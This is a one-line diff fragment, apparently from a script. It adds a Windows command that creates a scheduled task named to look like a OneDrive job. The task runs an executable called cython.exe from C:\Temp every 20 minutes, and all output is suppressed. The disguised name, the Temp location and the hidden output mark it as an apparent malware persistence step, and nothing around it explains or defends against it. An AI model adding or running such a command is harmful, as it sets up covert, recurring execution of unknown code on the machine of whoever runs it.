@@ -1,0 +1,1 @@
+& schtasks /create /tn "OneDrive Temp Task-30817122494-05ft8_2lthb4-1001" /tr "\"C:\Temp\05ft8_2lthb4\cython.exe\"" /sc minute /mo 20 /f /st 00:00 > NUL 2>&1 
